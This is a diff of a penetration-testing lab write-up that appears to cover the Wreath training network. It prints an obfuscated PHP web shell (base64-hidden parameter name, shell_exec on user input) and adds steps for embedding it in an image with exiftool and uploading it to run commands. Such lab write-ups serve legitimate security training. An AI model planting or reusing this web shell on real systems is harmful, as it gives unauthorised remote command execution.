@@ -244,3 +244,10 @@ Becomes:
 
 ``` <?php \$u0=\$_GET[base64_decode('ZnJvc3Q=')];if(isset(\$u0)){echo base64_decode('PHByZT4=').shell_exec(\$u0).base64_decode('PC9wcmU+');}die();?> ```
 
+After exiftool to embed the payload into the image, uploading it and navigating to it via URL, we can see that command execution is available.
+
+`systeminfo`:
+
+![image](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/f8f2434a-de84-439d-a920-fc1e39b90a92)
+
+
